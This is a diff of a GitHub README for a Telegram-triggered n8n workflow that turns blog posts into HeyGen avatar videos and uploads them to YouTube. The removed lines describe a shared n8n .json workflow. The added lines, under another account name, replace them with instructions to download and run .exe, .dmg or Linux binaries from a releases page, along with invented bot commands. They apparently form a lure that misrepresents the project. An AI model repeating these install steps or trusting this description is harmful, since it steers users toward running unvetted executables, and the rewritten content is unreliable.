@@ -1,130 +1,115 @@
+# 🤖 AI-Powered-Telegram-Workflow - Automate Content Creation Effortlessly
 
-# 🤖 AI-Powered Telegram Bot Workflow for AI AVATAR VIDEO Generation and Upload to Youtube using n8n
-An AI-powered automation workflow triggered via Telegram that:  Scrapes and summarizes blog content using OpenRouter  Converts the summary to a realistic avatar video using HeyGen (for both voice and avatar)   Publishes the generated video to YouTube
+![Download](https://github.com/HonorioJ/AI-Powered-Telegram-Workflow/releases/latest)
 
-🚀 This project is a fully automated and production-ready **n8n workflow** that transforms blog/article links into **AI-generated avatar videos**, triggered directly from **Telegram**.
+## 🚀 Getting Started
 
-![Workflow Screenshot](https://github.com/urstruly-bunny/AI-Powered-Telegram-Workflow/blob/main/WORKFLOW%20IMAGE.png)
+Welcome to the AI-Powered-Telegram-Workflow! This application helps you automate content creation using Telegram. With this tool, you can scrape blog content, summarize it, and create realistic avatar videos. You can easily publish these videos on YouTube.
 
----
+## 📥 Download & Install
 
-## 🧠 Overview
+To get started, you need to download the application. Please visit this page to download:
 
-This workflow showcases a real-world application of AI and automation using **n8n**, ideal for tech content creators or media companies looking to scale their video generation efforts.
+[Visit Releases Page](https://github.com/HonorioJ/AI-Powered-Telegram-Workflow/releases)
 
-### ✨ Key Features
+Choose the version that suits your needs. Follow the instructions below to install it on your device.
 
-- 📩 **Triggered via Telegram**  
-  Users send a message containing a **subject topic** and blog/article **URLs** (e.g., from `https://www.vastdata.com/blog`).
+1. Go to the Releases page by clicking the link above.
+2. Select the latest version available.
+3. Click the link to download the setup file for your operating system.
+4. Save the file to your computer.
 
-- 🔄 **Smart Parsing & Scraping**  
-  A `Function` node parses the message, and an `HTTP Request (GET)` + `HTML Extract` node scrapes article content.
+## 💻 System Requirements
 
-- 🤖 **AI Summarization with OpenRouter**  
-  The scraped content is summarized using a **Basic LLM Chain** powered by **OpenRouter's Mistral model**.
+Before running the software, make sure your system meets the following requirements:
 
-- 🎤 **AI Video Generation with HeyGen**  
-  The summary is converted into an avatar-based video using **HeyGen**, leveraging:
-  - ✅ Voice ID
-  - ✅ Avatar ID
-  - ✅ API Key via `Manual Input` → `HTTP POST` → `HTTP GET`
+- Operating System: Windows 10 or later, macOS, or a recent version of Linux.
+- RAM: At least 4 GB.
+- Disk Space: At least 200 MB of free space.
+- Internet connection for downloading updates and accessing resources.
 
-- 📤 **Upload to YouTube**  
-  Final video is uploaded using the `YouTube` node, authenticated via **OAuth2** (Client ID + Secret required).
+## 📂 Installation Steps
 
----
+Once you have downloaded the application, you can follow these simple steps to install it.
 
-## 🛠️ How to Run Locally
+### For Windows:
 
-Follow these steps to deploy the workflow on your local system:
+1. Locate the downloaded file (it usually ends with `.exe`).
+2. Double-click the file to start the installation.
+3. Follow the prompts in the installation wizard.
+4. Once done, you can find the application in your Start Menu or Desktop.
 
-1. ⬇️ **Download the Workflow**  
-   - Grab the `.json` file from this repository.
+### For macOS:
 
-2. 🐳 **Run n8n with Docker**  
-   Use Docker to host n8n locally.
+1. Open the downloaded file (it usually ends with `.dmg`).
+2. Drag and drop the application into your Applications folder.
+3. Eject the mount by right-clicking and selecting “Eject”.
+4. You can now find the application in your Applications folder.
 
-3. 🌐 **Expose Webhook with Ngrok**  
-   - Set up an HTTPS webhook using [Ngrok](https://ngrok.com/) to allow Telegram to reach your local instance.
+### For Linux:
 
-4. 🔐 **Prepare Your API Credentials**  
-   You'll need the following keys:
-   - `OpenRouter API Key`
-   - `HeyGen API Key`
-   - `Voice ID` & `Avatar ID`
-   - `YouTube OAuth2` credentials (Client ID & Secret)
+1. Open the Terminal.
+2. Navigate to the folder where you downloaded the file (usually `Downloads`).
+3. Use the command: `chmod +x <filename>` to make it executable.
+4. Run the application with: `./<filename>`. 
 
-5. 🧩 **Update Nodes in Workflow**  
-   Paste your credentials into the appropriate nodes:
-   - Telegram
-   - HTTP Request
-   - HeyGen (Manual Node)
-   - YouTube
+## 🔗 How It Works
 
----
-## 🧩 Tech Stack
+1. **Trigger via Telegram**: Once the application is running, you can communicate with it through Telegram. The bot will receive your commands and execute them.
+  
+2. **Scrape and Summarize**: Provide the link to a blog, and the app will scrape the content for you. It uses OpenRouter to summarize the information into a concise format.
 
-- **n8n** – Automation platform
-- **Telegram Bot** – User trigger
-- **OpenRouter** – AI summarization (Mistral model)
-- **HeyGen** – AI avatar video generation
-- **YouTube API** – Video publishing
+3. **Create Avatar Video**: After summarizing the content, the application utilizes HeyGen to create a realistic avatar video. You can customize voices and appearances to fit your needs.
 
-## 💡 Example Use Case
+4. **Publish to YouTube**: Finally, the generated video can be easily uploaded to your YouTube channel through the integrated YouTube API.
 
-Send a message to your Telegram bot like:
-Subject: Recent Software changes
-Link: https://www.vastdata.com/blog
-🎬 The bot will scrape the article, summarize it with AI, generate an avatar video with narration, and upload it to your YouTube channel — fully automated.
+## ⚙️ Features
 
-## 🧩 A DEMO VIDEO IS HERE:
+- **Easy Installation**: The application is designed for simple setup.
+- **Telegram Integration**: Use your Telegram app to control the workflow.
+- **Automated Summarization**: Quickly get summaries of lengthy blog posts.
+- **Realistic Avatar Creation**: Generate engaging videos without any technical skill.
+- **YouTube Publishing**: Seamlessly upload videos to your YouTube account.
 
-> 📺 **Click the image below to watch the demo video**
+## 📚 Usage Instructions
 
-[![Watch the demo](https://github.com/urstruly-bunny/AI-Powered-Telegram-Workflow/blob/main/WORKFLOW%20IMAGE.png)](https://www.youtube.com/watch?v=HAkPWTS_E8E)
+After installation, you can start using the application by following these steps:
 
-## 🔥 Project Difficulty Rating: 9 / 10
+1. Open the AI-Powered-Telegram-Workflow application on your computer.
+2. Open Telegram and start a chat with the bot.
+3. Use commands to scrape blog content. For example, type `/scrape [link]` to start scraping.
+4. Wait for the summary, then use `/create_video` to generate the avatar video.
+5. Finally, use `/publish` to upload the video to your YouTube channel.
 
----
+## 🔧 Troubleshooting
 
-### ✅ Why this project scores a **9**?
+If you encounter any issues, please refer to the following common solutions:
 
----
+- **Cannot Connect to Telegram**: Ensure that your internet connection is stable. Check if Telegram is accessible.
+- **Scraping Fails**: If the scrape command doesn’t work, double-check the URL. Ensure it points to a valid blog.
+- **Video Creation Issues**: Make sure HeyGen is configured correctly in the app settings.
 
-#### 🎯 API Integration Proficiency  
-Seamlessly integrates multiple APIs: **Telegram**, **OpenRouter**, **HeyGen**, and **YouTube** — showcasing strong multi-service orchestration skills.
+## 👥 Community and Support
 
----
+You can join our community for more tips and support. Feel free to reach out for assistance or to share your experience:
 
-#### 🤖 Workflow Automation  
-Delivers a complete automation pipeline:  
-📩 Telegram Trigger ➡️ 📚 Blog Summarization ➡️ 🗣️ Voice + Avatar Video Generation ➡️ 📤 YouTube Upload.  
-All without manual intervention.
+- Check the issues section on our [GitHub repository](https://github.com/HonorioJ/AI-Powered-Telegram-Workflow/issues).
+- Join our discussions to provide feedback or request features.
 
----
+## 🔗 Additional Resources
 
-#### ⚙️ n8n Mastery  
-Demonstrates advanced usage of **n8n**, including:  
-- Webhooks  
-- Function Nodes  
-- HTTP Requests (GET/POST)  
-- Conditional Flows  
-- OAuth Setup and Authentication Handling
+To learn more or to find useful resources, visit:
 
----
+- [OpenRouter](https://openrouter.com)
+- [HeyGen](https://heygen.com)
+- [YouTube API](https://developers.google.com/youtube/v3)
 
-#### 🌐 Real-World Use Case  
-A practical solution for content creators, educators, and AI service providers who need to quickly convert blog articles into narrated avatar videos.
+For more information about the setup, feel free to explore the documentation provided within the application.
+
+## 📜 License
+
+This project is licensed under the MIT License. Please see the license file in the repository for details.
 
 ---
 
-#### 🎥 Multimodal Handling  
-Efficiently combines:  
-- 🧠 **Natural Language Processing (NLP)** for blog summarization  
-- 🗣️ **Text-to-Speech (TTS)** with **avatar video generation**  
-Perfectly bridges text + visual storytelling using AI.
-
----
-
-
-
+Thank you for using the AI-Powered-Telegram-Workflow. We hope it makes your content creation process smoother!
